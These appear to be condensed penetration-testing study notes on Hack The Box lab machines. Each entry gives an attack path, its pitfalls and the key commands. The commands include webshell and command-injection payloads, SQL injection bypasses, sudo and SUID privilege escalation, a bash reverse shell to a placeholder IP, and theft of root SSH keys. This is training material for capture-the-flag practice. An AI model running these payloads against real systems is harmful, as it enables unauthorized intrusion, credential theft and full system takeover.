**Edge cases:**

* Only 80/tcp is open; the whole box is **directory discovery**: `gobuster` must surface `/dev` (301) and `/uploads`. `/dev/` has `Options +Indexes` and contains `phpbash.php` + `phpbash.min.php` — an unauthenticated PHP webshell, no upload needed.
* `user.txt` is world-readable from the `www-data` shell — do not burn time pivoting for user; the pivot is for root.
* `sudo -l` shows `(scriptmanager : scriptmanager) NOPASSWD: ALL`, which requires the **explicit** `sudo -u scriptmanager /bin/bash` syntax (`sudo -l` output with a runas user is a common misread).
* `/scripts` is owned by `scriptmanager`, and root cron runs `* * * * * cd /scripts; for f in *.py; do python "$f"; done`. The tell is `test.txt`'s mtime ticking forward between two `ls -la` — that's how you find a cron you cannot read. Drop any `.py`; no shell needed if `python` builds a socket.

**Commands to remember:**

```bash
gobuster dir -u http://bashed.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
# browse http://bashed.htb/dev/phpbash.php (interactive, no auth)
sudo -l; sudo -u scriptmanager /bin/bash
ls -la /scripts   # twice: watch test.txt mtime
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Notes:** [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://foobarto.me/htb/machines/bashed/)

## Broker

**Path:** ActiveMQ 5.15.15 CVE-2023-46604 (OpenWire 61616) → `activemq`; `sudo nginx` → rogue config serving `/` as root → read files / `PUT` an SSH key → root.

**Edge cases:**

* Port triage is the skill: nine ports, but only **61616** matters — its OpenWire banner prints `ProviderVersion 5.15.15` (<5.15.16 = vulnerable). 8161/80 are Jetty/nginx admin UIs with `admin:admin` basic auth and are a dead end.
* Exploit = ship a **Spring XML** with a `java.lang.ProcessBuilder` bean (`init-method="start"`) and point the target at it; the target fetches the XML **twice**, so seeing two GETs is normal.
* `sudo nginx` is a full root file read *and* write: config with `user root;` + `root /;` + `autoindex on;` serves the whole filesystem; adding `dav_methods PUT;` lets you `PUT /root/.ssh/authorized_keys`. Pitfall: a running nginx can't be killed, and re-using the port makes the new instance abort — **bump the `listen` port on every attempt**.
* Alternate root (Zimbra CVE-2022-41347 style): `error_log /etc/ld.so.preload warn;` then request a nonexistent path containing `/tmp/pwn.so`, compile a `__attribute__((constructor))` `.so` (`gcc -fPIC -shared -ldl -o /tmp/pwn.so pwn.c`) that chowns/chmods a copied `/bin/bash`, and trigger it with any setuid binary.

**Commands to remember:**

```bash
nmap -p- --min-rate 10000 IP; nmap -sCV -p 22,80,443,8161,61616 IP
python exploit.py -i IP -u http://ATTACKER/poc.xml
sudo /usr/sbin/nginx -c /dev/shm/nginx.conf; curl localhost:1337/etc/shadow
curl -X PUT localhost:1338/root/.ssh/authorized_keys -d '<pubkey>'
```

**Notes:** [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · [Web technologies](/notes/web-applications/web-technologies/) · Writeup: [source](https://0xdf.gitlab.io/2023/11/09/htb-broker.html)

## Silentium

**Path:** `staging` vhost → Flowise 3.0.5 → forgot-password leaks reset token → ATO → CustomMCP `Function()` JS RCE in Docker → env password reuse → SSH `ben` → Gogs symlink write → root `authorized_keys`.

**Edge cases:**

* Unknown vhosts all 301 to the apex, so `--hh` filtering is useless — use `ffuf -ac` (auto-calibration), which found `staging`. `GET /api/v1/version` leaks the Flowise version unauthenticated; `POST /api/v1/account/forgot-password` returns the **whole user object** (`credential` bcrypt hash + `tempToken`) → **CVE-2025-58434** account takeover, and 404-vs-201 gives user enumeration.
* **CVE-2025-59528**: `/api/v1/node-load-method/customMCP` passes `mcpServerConfig` to `Function('return '+input)()`. Needs a **Bearer API key generated in the UI** — a token from a public POC returns `{"error":"Unauthorized Access"}`. Success looks like failure: the response is `No available actions...` *after* the command already ran — confirm out-of-band (`tcpdump -ni tun0 icmp`).
* Container is Alpine: no bash, so bash reverse shells silently die. `nc`, `python` and `wget` exist → fetch a python `pty.spawn("sh")` script in one request, execute it in a second (avoids quote nesting). `env` leaks `FLOWISE_PASSWORD` and `SMTP_PASSWORD`; only the SMTP one is reused for SSH as `ben` (`FLOWISE_PASSWORD` was overwritten by the reset).
* Gogs version without a shell: `?v=<hash>` on static assets = git commit → GitHub commit page says 0.13.3. **CVE-2025-8110**: commit symlink `sshdir -> /root/.ssh`, then `PUT .../contents/sshdir/authorized_keys`; the API answers "Something went wrong" but the write already happened.

**Commands to remember:**

```bash
ffuf -u http://IP -H "Host: FUZZ.site.tld" -w subdomains -ac
curl -X POST http://staging.site.tld/api/v1/account/forgot-password -d '{"email":"ben@site.tld"}'
curl -X POST http://staging.site.tld/api/v1/node-load-method/customMCP -H "Authorization: Bearer <ui-key>" -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"id\");return 1;})()})"}}'
ln -s /root/.ssh sshdir && git add sshdir && git commit -m x && git push
```

**Notes:** [Environment variables abuse](/notes/linux-privilege-escalation/environment-variables-abuse/) · [GitLab](/notes/web-applications/web-technologies/gitlab/) · Writeup: [source](https://0xdf.gitlab.io/2026/09/12/htb-silentium.html)

## Networked

**Path:** `/backup/backup.tar` source leak → image upload saves `<ext after first dot>` → Apache `AddHandler` runs `.php` anywhere in the filename → cron `check_attack.php` filename injection → `changename.sh` ifcfg injection → root.

**Edge cases:**

* The leak is a **tarball in `/backup/`**, not a directory listing — always download and untar backup artifacts.
* The extension allow-list compares the *submitted* name, but the saved name is `IP.<everything after first dot>` → `shell.php.png` passes the `.png` check. It executes because `AddHandler php5-script .php` matches `.php` **anywhere** in the filename (the `SetHandler` vs `AddHandler` nuance). The MIME check is `strpos($mime,'image/')===0`, so a real PNG header with `<?php system($_GET["cmd"]); ?>` appended still passes.
* Cron runs every 3 min on `uploads/`; `exec("... rm -f $path$value")` means the **filename** is the injection point (`touch 'a; <cmd>; b'`). Payloads must survive POSIX `sh` from cron — `nc -e sh` fails there, so base64-encode the whole command and **test your shell manually as apache first**.
* `changename.sh` regex `^[a-zA-Z0-9_\ /-]+$` still permits spaces; values are dumped into `ifcfg-guly`, and words after a space in `VAR=value` are executed by the network script → `a /bin/bash` = root shell. Confirm the handler in `/etc/httpd/conf.d/php.conf`.

**Commands to remember:**

```bash
tar xvf backup.tar
curl 'http://host/uploads/10_10_14_5.php.png?cmd=id'
touch '/var/www/html/uploads/a; echo <b64> | base64 -d | sh; b'
sudo /usr/local/sbin/changename.sh   # answer: a /bin/bash
```

**Notes:** [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://0xdf.gitlab.io/2019/11/16/htb-networked.html)

## UpDown

**Path:** SSRF is a dead end → `dev` vhost needs a magic header (leaked `.htaccess`) → `.git` dump → code review → LFI with `phar://` → `proc_open` bypasses `disable_functions` → setuid Python2 `input()` eval → `sudo easy_install` → root.

**Edge cases:**

* `dev.siteisup.htb` is 403 by design: `.htaccess` uses `SetEnvIfNoCase Special-Dev "only4dev"` + `Deny from All` / `Allow from env=` → send `Special-Dev: only4dev`. Rules are processed in order and the **last** match wins — read `.htaccess` logic, don't just assume basic auth.
* `.git` sat on the **subdomain root**, missed by the wordlist — check `.git` manually on every vhost; `git-dumper` reconstructs it (may need `git config --global --add safe.directory`).
* Upload denylist blocks `php, php[0-9], html, py, pl, phtml, zip, rar, gz, tar` — but `phar://` reads any archive regardless of extension: upload `rev.0xdf` (`zip rev.0xdf rev.php`) and call `?page=phar://uploads/<md5>/rev.0xdf/rev` (the app appends `.php`). Zip upload crashes the `unlink()`, so the file survives; `/uploads` is cron-cleaned every 5 minutes — act fast or re-upload.
* Heavy `disable_functions`: verify with `phpinfo()` + `dfunc-bypasser` (python2; must be patched to send the dev header). `proc_open` was **not** disabled → shell via `descriptorspec`. `siteisup` setuid binary just calls `/usr/bin/python /home/developer/dev/siteisup_test.py`; Python2 `input()` = `eval` → `__import__('os').system('bash')`. `sudo easy_install <dir>` executes `setup.py` → root. Beyond root: LFI→RCE with a PHP filter chain when you cannot write a file at all.

**Commands to remember:**

```bash
curl -H 'Special-Dev: only4dev' http://dev.siteisup.htb/
git-dumper http://siteisup.htb/dev/.git/ .
./siteisup   # then: __import__('os').system('bash')
sudo easy_install /tmp/0xdf/   # setup.py with os.system
```

**Notes:** [LFI](/notes/web-applications/web-attacks/local-file-inclusion-lfi/) · [Shells and payloads](/notes/utilities-scripts-and-payloads/shells-and-payloads/) · Writeup: [source](https://0xdf.gitlab.io/2023/01/21/htb-updown.html)

## Swagshop

**Path:** Magento 1 store → `shoplift` adds an admin → authenticated PHP object injection RCE (needs `install_date`) → `sudo vi` → root.

**Edge cases:**

* Version fingerprinting is murky on purpose: `/downloader/` (Magento Connect Manager) shows a version but has since been **removed from the box**; `RELEASE_NOTES.txt` stops at 1.7.0.2. Fall back to `searchsploit magento` and try the authenticated 1.9 RCE. Admin add: `python poc.py <ip>` prints generated creds; log in at `/index.php/admin` (not `/admin`).
* `37811.py` breaks with `ControlNotFoundError` unless the target URL includes `/index.php/admin`; it also needs the exact `install_date` copied from `/app/etc/local.xml` (`<date><![CDATA[...]]></date>`) — this is the keyed-hash secret, not a version string.
* Alternative (patched here): upload a malicious Magento package via `/downloader/` with `package.xml` + MD5 hash → webshell in `errors/`.
* `sudo /usr/bin/vi /var/www/html/*`: the wildcard is a **prefix** check, so `sudo /usr/bin/vi /var/www/html/../../../root/root.txt` reads the flag; for a shell use `sudo vi /var/www/html/x -c ':!/bin/sh'` or `:set shell=/bin/sh` + `:shell`.

**Commands to remember:**

```bash
curl -s http://IP/app/etc/local.xml | grep date
python magento_rce.py 'http://IP/index.php/admin' "id"
sudo /usr/bin/vi /var/www/html/../../../root/root.txt
sudo vi /var/www/html/a -c ':!/bin/sh'
```

**Notes:** [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · [Fuzzing](/notes/web-applications/fuzzing/) · Writeup: [source](https://0xdf.gitlab.io/2019/09/28/htb-swagshop.html)

## Nineveh

**Path:** Port 80 and 443 host **different** apps → `/department` login bypass (type juggling) → LFI with a `ninevehNotes` substring filter → phpLiteAdmin writes a `.php` DB → RCE; steghide key + port knocking → chkrootkit → root.

**Edge cases:**

* Two web roots on the same hostname: 80 gives `/info.php` + `/department`, 443 gives `/db` (phpLiteAdmin 1.9) and `/secure_notes`. Enumerate both schemes (and `gobuster -k`).
* Auth bypass is PHP type confusion, not SQLi: `username=admin&password[]=` makes `strcmp(array(),$pass)` return `NULL == 0` → true. (HackTricks: try `user[]=a&pwd=b` variants on any PHP login.) The LFI filters on the literal string `ninevehNotes`, so plain traversal prints "No Note is selected." Bypasses: `files/ninevehNotes/../../../../etc/passwd`, or `?notes=/ninevehNotes/../var/tmp/<shell>.php` — PHP cancels the fake dir while the check still matches.
* phpLiteAdmin RCE: create a database named `*.php`, create a table with one text field whose **default value** is the PHP payload (use double quotes — single quotes are consumed by SQLite) → payload lands in `/var/tmp/<name>.php`, then reach it through the LFI.
* Steg: `/secure_notes/nineveh.png` has an RSA key + `user@host` in `strings`, and a whole tar appended (`binwalk -e` gives `nineveh.priv`/`.pub`) → username `amrois` for SSH. SSH is filtered by `knockd` (`/etc/knockd.conf`): sequence `571,290,911` within 5s; knock with three `nmap` calls, or just `ssh` from localhost on the box. Root: `/report` shows chkrootkit running per-minute; chkrootkit 0.49 has the unquoted `SLAPPER_FILES` loop bug (**CVE-2014-0476**) → drop an executable at `/tmp/update` and wait.

**Commands to remember:**

```bash
# login POST: username=admin&password[]=
# LFI: ?notes=/ninevehNotes/../var/tmp/x.php&cmd=id
binwalk -e nineveh.png; strings -n 20 nineveh.png
for i in 571 290 911; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i <ip> >/dev/null; done
searchsploit chkrootkit   # 33899
```

**Notes:** [LFI](/notes/web-applications/web-attacks/local-file-inclusion-lfi/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html)

## Pandora

**Path:** UDP/161 SNMP → creds in a process command line → SSH `daniel` → internal-only vhost on `localhost:80` running Pandora FMS 7.0NG.742 → SQLi → session cookie → RCE → SUID backup PATH hijack → root.

**Edge cases:**

* UDP is part of recon: `nmap -sU -top-ports=100` found 161. `snmpwalk -v2c -c public` is slow; `snmpbulkwalk -Cr1000` is dramatically faster. Process args are the gold: `HOST-RESOURCES-MIB::hrSWRunParameters` contained `sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc <password>`. Re-join `hrSWRunName.<pid>` with `hrSWRunParameters.<pid>` to rebuild `ps`.
* The vhost is `<VirtualHost localhost:80>` with `AssignUserID matt matt` (mpm-itk) — invisible externally. Read `/etc/apache2/sites-enabled/*.conf` after foothold, then `ssh -L 9001:localhost:80`.
* SQLi in `/pandora_console/include/chart_generator.php?session_id=` (`$_REQUEST`, so GET works): `' union select 1,2,3;-- -` fixes the column count; sqlmap finds boolean/error/time-based (not UNION). Session hijack: dump `tsessions_php` (filter `data<>''`), then `wfuzz -b PHPSESSID=FUZZ` over the ids — the valid one returns a much larger page. Or inject `id_usuario|s:5:"admin";` via UNION to become admin.
* SUID/sudo **fail from a webshell**: mpm-itk's per-vhost UID switching blocks setuid elevation. Get a real login (drop `authorized_keys` as matt) before privesc. `pandora_backup` (SUID) calls `system("tar ...")` with no path → `export PATH=/dev/shm:$PATH` + fake `tar` = root (ltrace confirms the call).

**Commands to remember:**

```bash
snmpbulkwalk -Cr1000 -c public -v2c <ip> > snmp.txt; grep hrSWRunParameters snmp.txt
ssh -L 9001:localhost:80 daniel@<ip>
sqlmap -u 'http://pandora.panda.htb:9001/pandora_console/include/chart_generator.php?session_id=1'
ltrace ./pandora_backup; export PATH=/dev/shm:$PATH; echo -e '#!/bin/bash\nbash' > tar; chmod +x tar
```

**Notes:** [SNMP](/notes/protocols-and-services/snmp/) · [Environment variables abuse](/notes/linux-privilege-escalation/environment-variables-abuse/) · Writeup: [source](https://0xdf.gitlab.io/2022/05/21/htb-pandora.html)

## OpenAdmin

**Path:** Default Apache page → `/ona` = OpenNetAdmin 18.1.1 → xajax command injection → `www-data` → DB creds from config → `su jimmy` → internal vhost on 127.0.0.1:52846 → joanna's encrypted key → `sudo nano` → root.

**Edge cases:**

* `/music` is filler; the useful link is the "Login" pointing to `/ona` — click links instead of only brute-forcing. The ONA exploit is one POST body; the **trailing slash on `/ona/`** matters (without it the injection fails). Wrap the command in `echo BEGIN; ...; echo END` and sed between markers for clean output.
* Credentials live in `/var/www/html/ona/local/config/database_settings.inc.php` (`db_login`/`db_passwd`) and are **reused** for the system user `jimmy` (`su jimmy`). The second-stage site is bound to `Listen 127.0.0.1:52846` in `/etc/apache2/sites-enabled/internal.conf` and runs as joanna (`AssignUserID`); tunnel with `ssh -L`, and note the symlink `/var/www/ona -> /opt/ona/www`.
* Two ways in: drop a PHP webshell in `/var/www/internal` (runs as joanna), or log in with hardcoded `joanna:joanna` in `index.php` to get a passphrase-protected `id_rsa`. The key passphrase is not the DB password: `ssh2john` → john with a `grep -i ninja rockyou.txt` shortlist → `openssl rsa`.
* `sudo /bin/nano /opt/priv` (GTFOBins nano): `^R` `^X`, then `reset; sh 1>&0 2>&0` — plain `/bin/sh` hangs because stdio is still attached to nano.

**Commands to remember:**

```bash
curl -s -d "xajax=window_submit&xajaxr=<ts>&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping" http://host/ona/
ssh -L 52846:localhost:52846 jimmy@host
ssh2john joanna-enc > h; john --wordlist=ninja.txt h; openssl rsa -in joanna-enc -out id_rsa
sudo /bin/nano /opt/priv   # ^R ^X, then: reset; sh 1>&0 2>&0
```

**Notes:** [Pivoting and tunneling](/notes/utilities-scripts-and-payloads/pivoting-tunneling-port-forwarding/) · [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · Writeup: [source](https://0xdf.gitlab.io/2020/05/02/htb-openadmin.html)

## Precious

**Path:** URL→PDF microservice → `pdfkit 0.8.6` command injection (CVE-2022-25765) → `ruby` → `~/.bundle/config` creds → `henry` → `sudo ruby update_dependencies.rb` unsafe YAML → root.

**Edge cases:**

* Fingerprint from the **artifact**, not the headers: `exiftool` on the generated PDF shows `Creator: Generated by pdfkit v0.8.6`; response headers only reveal nginx + Phusion Passenger. The service blocks metadata/local targets (`127.0.0.1`, `file://`) — don't sink time into SSRF here.
* Payload is backticks inside a URL parameter: ``http://10.10.14.6/?name=%20`id` ``; the leading `%20` (encoded space) is what makes commands with spaces work. This survives because PDFKit interpolates the URL into a shell command.
* `~/.bundle/config` (mode `dr-xr-xr-x`) stores `BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:<pass>"` — Bundler/RubyGems credentials are a classic lateral-movement file; test with `su - henry` and over SSH.
* Root: `sudo ruby /opt/update_dependencies.rb` calls `YAML.load` (not `safe_load`) on `dependencies.yml`. The gadget chain (`Gem::Installer`/`Gem::SpecFetcher`/`Gem::Requirement`/`Net::WriteAdapter` with `Kernel.system`) executes as root. **Relative path pitfall:** the script reads `dependencies.yml` from the CWD, so `cd /dev/shm` and run sudo from there; the `id` output is buried in a Ruby traceback — don't miss it.

**Commands to remember:**

```bash
exiftool out.pdf | grep Creator
# url=http://10.10.14.6/?name=%20`id`
cat ~/.bundle/config
sudo ruby /opt/update_dependencies.rb   # from the dir containing dependencies.yml
# PAYLOAD: !ruby/object:Gem::Requirement + Net::WriteAdapter → method_id: :system, git_set: <cmd>
```

**Notes:** [PDF generators](/notes/web-applications/web-technologies/pdf-generators/) · [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · Writeup: [source](https://0xdf.gitlab.io/2023/05/20/htb-precious.html)

## Busqueda

**Path:** Flask "Searcher" using Searchor 2.4.0 → `eval()` injection in the query → `svc` → `.git/config` creds → Gitea → `docker-inspect` env leak → MySQL → admin → `system-checkup.py full-checkup` CWD hijack → root.

**Edge cases:**

* Searchor 2.4.0 builds `eval(f"Engine.{engine}.search('{query}', ...)")`; payload lives in **query**: `' + __import__('os').popen('id').read() + '`. Encoding pitfall: in Burp, select only the payload and Ctrl-u (URL-encode once). `+` must become `%2b`, but spaces must become `+` — double-encoding breaks it.
* `.git/config` in the webroot contains `url = http://cody:<pass>@gitea.searcher.htb/...` → both a vhost to enumerate and reusable creds (svc's real name is cody). `sudo -l` output ends with `*`, which means **no-argument invocation is denied** — you must pass an action string or you get "Sorry, user svc is not allowed".
* `docker-inspect` abuses Go templates: pass `'{{json .}}'` and pipe to `jq` to read container `Env` (DB password) and `NetworkSettings.Networks` (container IP, reachable after the foothold). Gitea alternative: dump the `user` table from MySQL (bcrypt, uncracked) then reuse the DB password for `administrator` → private `scripts` repo = source of the sudo script.
* `full-checkup` runs `./full-checkup.sh` **relative to CWD** → write it in `/dev/shm`, `chmod +x`, run sudo from there (copy bash + chmod 4777).

**Commands to remember:**

```bash
# query: ' + __import__('os').popen('id').read() + '
cat /var/www/app/.git/config
sudo python3 /opt/scripts/system-checkup.py docker-ps
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
echo -e '#!/bin/bash\ncp /bin/bash /tmp/x\nchmod 4777 /tmp/x' > full-checkup.sh
```

**Notes:** [OS command injection](/notes/web-applications/web-attacks/os-command-injection/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://0xdf.gitlab.io/2023/08/12/htb-busqueda.html)

## Monitored

**Path:** SNMP process args → `svc` creds (valid but disabled) → Nagios XI API `authenticate` token → CVE-2023-40931 SQLi → `xi_users.api_key` → create admin via API → command RCE → root via writable service binary or `getprofile.sh` symlink.

**Edge cases:**

* SNMP again: `hrSWRunParameters` for a `sudo` process leaked `-u svc /bin/bash -c /opt/scripts/check_host.sh svc <pass>`. Login with it fails, but the **error text differs** for a valid-yet-disabled account vs. a bad password — read login errors, and retry those creds against the API instead of the UI.
* Token flow (poorly documented): `POST /nagiosxi/api/v1/authenticate` with `username`+`password` (+`valid_min`) returns a token; `?apikey=` rejects it, but `https://host/nagiosxi/?token=<token>` logs you in and sets a session cookie. CVE-2023-40931: authenticated SQLi on `POST /nagiosxi/admin/banner_message-ajaxhelper.php` with `id=3&action=acknowledge_banner_message`; sqlmap needs `--cookie "nagiosxi=<sess>"` and `-p id`. No real banner ID required.
* `xi_users` gives `api_key` per user (hashes didn't crack) → with admin's key, `POST /api/v1/system/user` + `auth_level=admin` **creates an admin** (no admin session needed) — the easiest pivot from API to UI. RCE is GUI-only-ish: Core Config Manager → Commands → add `bash -c '<revshell>'`, then Hosts → localhost → set Check command → "Run Check Command".
* Root path A: `/usr/local/nagios/bin/nagios` is owned/writable by nagios and is the systemd `ExecStart`; replace it and `sudo manage_services.sh restart nagios` (service "fails" but the script ran). Root path B (cleaner): `ln -sf /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log`, run `sudo getprofile.sh <name>`, then `unzip -p profile.zip profile-*/phpmailer.log` — `zip` follows the symlink and stores root's key.

**Commands to remember:**

```bash
snmpwalk -v2c -c public host | tee snmp.txt
curl -k -d 'username=svc&password=<pw>&valid_min=5' https://host/nagiosxi/api/v1/authenticate
sqlmap -u 'https://host/nagiosxi/admin/banner_message-ajaxhelper.php' --data='id=3&action=acknowledge_banner_message' -p id --cookie 'nagiosxi=<sess>' --batch --dbs
ln -sf /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log; sudo getprofile.sh x; unzip -p profile.zip 'profile-*/phpmailer.log'
```

**Notes:** [SNMP](/notes/protocols-and-services/snmp/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://0xdf.gitlab.io/2024/05/11/htb-monitored.html)

## BoardLight

**Path:** Dolibarr CRM on `crm.board.htb` → default creds → PHP-injection CVE in the website builder → `conf.php` password reuse → Enlightenment SUID LPE → root.

**Edge cases:**

* The web root is a static PHP site; the real target only appears via **vhost fuzzing** (`crm` vhost), and it accepts default `admin:admin`. The website builder's PHP injection is **CVE-2023-30253**.
* Dolibarr's filter for PHP tags is **case-sensitive**: `<?Php ... ?>` saves fine, and the payload only executes in preview when "Show dynamic content" is enabled.
* `conf.php` also ships `conf.php.old`/`.example`; the DB password (`serverfun2$2023!!`) is reused for the OS user `larissa` (`su` and SSH).
* `ps auxww` looks empty because `/proc` is mounted `hidepid=invisible` (verify with `mount | grep ^proc`) — don't conclude "no processes"; desktop-style home dirs hint at a GUI WM ⇒ check Enlightenment SUIDs. **CVE-2022-37706** manual exploit needs a real directory literally named `;` and a matching argument path — the POC hides this.

**Commands to remember:**

```bash
ffuf -u http://IP -H "Host: FUZZ.board.htb" -w subdomains-top1million-20000.txt -mc all -ac
feroxbuster -u http://IP -x php
mkdir -p "/tmp/;/tmp/0xdf"; echo /bin/bash > /tmp/0xdf; chmod +x /tmp/0xdf
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/0xdf" /tmp///net
```

**Notes:** [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · [Fuzzing](/notes/web-applications/fuzzing/) · Writeup: [source](https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html)

## Magic

**Path:** SQLi login bypass → webshell upload with double extension → DB creds → SUID `sysinfo` PATH hijack → root.

**Edge cases:**

* Login bypass is plain `' or 1=1-- -`; no username enumeration needed.
* The upload has an extension allow-list **and** an `exif_imagetype` magic-byte check: keep a real PNG header, but put the PHP in the middle of the file.
* `.htaccess` `FilesMatch ".+\.ph(p([3457s]|-s)?|t|tml)"` has **no `$` anchor**, so `shell.php.png` is executed as PHP in `/images/uploads/`.
* The `mysql` client is absent but `mysqldump` exists — dump in place instead of tunnelling. `ltrace` on the SUID binary reveals `popen("fdisk -l")` with no full path ⇒ PATH hijack (any of `lshw/fdisk/cat/free`). `sysinfo` is SUID but only executable by group `users`; the low-priv user is the sole member.

**Commands to remember:**

```bash
# login: ' or 1=1-- -
cp img.png avatar.php.png   # insert <?php system($_GET['cmd']); ?> mid-file
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
ltrace sysinfo | grep popen
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/IP/443 0>&1' > /dev/shm/fdisk; chmod +x /dev/shm/fdisk; export PATH=/dev/shm:$PATH; sysinfo
```

**Notes:** [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · Writeup: [source](https://0xdf.gitlab.io/2020/08/22/htb-magic.html)

## Help

**Path:** GraphQL on :3000 leaks creds → HelpDeskZ login → blind SQLi in the attachment URL → SSH → old-kernel LPE → root.

**Edge cases:**

* Don't stop at the Apache default page on :80 — port **3000** is the GraphQL API; a GET to `/graphql` plus introspection gives the `user` query, which returns a hash directly.
* HelpDeskZ authenticated blind SQLi lives in the **last `param[]`** of the ticket-attachment download URL; true/false = attachment vs "Whoops!".
* Unintended path: `verifyAttachment()` rejects the PHP upload but never deletes the temp file, so it stays in `/support/uploads/tickets/` under `md5(filename+time).php`; brute force the timestamp and **account for target clock skew** (widen past the script's default 5 min).
* Root is just kernel: 4.4.0-116 → CVE-2017-16995 (`44298.c`/`45010.c`) or s-nail CVE-2017-5899.

**Commands to remember:**

```bash
curl -s IP:3000/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { queryType { name } } }"}' | jq
curl -s IP:3000/graphql -H "Content-Type: application/json" -d '{"query":"{ user { username password } }"}'
sqlmap -r ticket.request --level 5 --risk 3 -p 'param[]' --dump
gcc -o a 44298.c && ./a   # from /dev/shm
```

**Notes:** [SQL injection](/notes/web-applications/web-attacks/sql-injection/) · [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · Writeup: [source](https://0xdf.gitlab.io/2019/06/08/htb-help.html)

## Editorial

**Path:** Flask book site `/upload-cover` SSRF → internal API creds → git history → GitPython `ext::` RCE via sudo → root.

**Edge cases:**

* `/upload` (the form page) is a **decoy**; SSRF is the AJAX `/upload-cover` endpoint and it needs a multipart `bookfile` part or it 400s. Field name is `bookurl`, and the response is a relative path you must then GET (`/static/uploads/<uuid>`).
* SSRF reaches an internal API on `127.0.0.1:5000`; the "authors" welcome template contains `dev : dev080217_devAPI!@`.
* `~/apps` git history holds the `prod` password (`git log -p | grep -i password`).
* The sudo rule is **not NOPASSWD** (needs `sudo -S`), and GitPython clones with `multi_options=["-c protocol.ext.allow=always"]`; spaces and `;` in the `ext::` URL get mangled, so drop a script in `/tmp` and call `ext::sh -c /tmp/p.sh`; `clone_from` throws *after* the side effect (the error is expected).

**Commands to remember:**

```bash
curl -s -X POST http://editorial.htb/upload-cover -F bookurl=http://127.0.0.1:5000/api/latest/metadata/messages/authors -F bookfile=@/etc/hostname
git log -p | grep -i password
echo "$PASS" | sudo -S /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /tmp/p.sh'
```

**Notes:** [SSRF](/notes/web-applications/web-attacks/ssrf/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://foobarto.me/htb/machines/editorial/)

## Builder

**Path:** Jenkins on :8080 → CVE-2024-23897 CLI file read → bcrypt hash → admin → SSH key recovery → root SSH.

**Edge cases:**

* CVE-2024-23897 is only a **partial** file read: the first line of the target file is consumed as the CLI command and the next as an argument, so single-line files (`/var/jenkins_home/user.txt`, hostname) are trivial and multi-line files come back scrambled. Adding a dummy arg (`a`) reduces output to one line.
* To get whole files, try many subcommands (`connect-node`, `delete-job`, `offline-node`, `reload-job`) that accept many args.
* `users/users.xml` gives the directory name, then `users/<name>/config.xml` leaks `<passwordHash>#jbcrypt:$2a$10$...` → hashcat **`-m 3200 --user`** (the `#jbcrypt` prefix is parsed as a username).
* The Jenkins credential ID was `1`, not the display name; pipeline `sshagent (credentials: ['1'])` + `sh 'ssh ... root@host cat /root/.ssh/id_rsa'` recovers root's key. Decrypting the hidden base64 field from the admin UI via Script Console is an alternative.

**Commands to remember:**

```bash
wget http://IP:8080/jnlpJars/jenkins-cli.jar
java -jar jenkins-cli.jar -s http://IP:8080 help '@/etc/passwd' a
java -jar jenkins-cli.jar -s http://IP:8080 reload-job '@/var/jenkins_home/users/users.xml'
hashcat -m 3200 hash --user rockyou.txt
```

**Notes:** [Jenkins](/notes/web-applications/web-technologies/jenkins/) · [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · Writeup: [source](https://0xdf.gitlab.io/2024/02/12/htb-builder.html)

## Linkvortex

**Path:** Ghost blog → `dev` vhost with exposed `.git` → CVE-2023-40028 symlink-zip file read → config creds → root via sudo `clean_symlink.sh`.

**Edge cases:**

* Two separate vhosts: the main Ghost site and `dev.linkvortex.htb`; **nmap's `http-git` script** (not feroxbuster) finds the repo. `git-dumper`, then `git status` + `git diff --cached` shows a modified Ghost **test file with a plaintext password** — the login is `admin@linkvortex.htb`, not `admin`.
* CVE-2023-40028: zip a **symlink** (`zip -y`), POST as `importfile` to `/ghost/api/admin/db` with the `ghost-admin-api-session` cookie, then GET the path under `/content/images/`; the in-memory Python version needs `ZipInfo.create_system=3` and `external_attr |= 0xA0000000`.
* Read `/var/lib/ghost/config.production.json` (path leaked by `Dockerfile.ghost` in the repo) for SMTP creds, validated with `netexec ssh`.
